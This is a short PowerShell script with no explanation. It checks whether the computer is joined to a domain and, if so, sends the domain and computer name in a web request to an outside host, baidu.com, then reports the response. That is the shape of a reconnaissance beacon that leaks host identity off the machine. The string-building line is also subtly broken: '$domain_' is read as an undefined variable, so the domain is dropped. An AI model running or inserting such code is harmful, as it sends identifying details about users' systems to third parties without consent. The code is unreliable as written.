
$computerInfo = Get-ComputerInfo  
  
if ($computerInfo.CsPartOfDomain) 
{  
 $domain = $computerInfo.Domain  
    $computerName = $computerInfo.CsName  
    $domain = $computerInfo.CsDomain
    $fullString = "$domain_$computerName"  
    $url = "http://www.baidu.com/?q=$fullString"  
    try {  
        $response = Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing  
        Write-Host "URL: $url"  
        Write-Host "$($response.StatusCode)"  
    } catch {  
        Write-Host "error: $_"  
    }  
} 
else
{  
    Write-Host "bye"  
    exit  
}
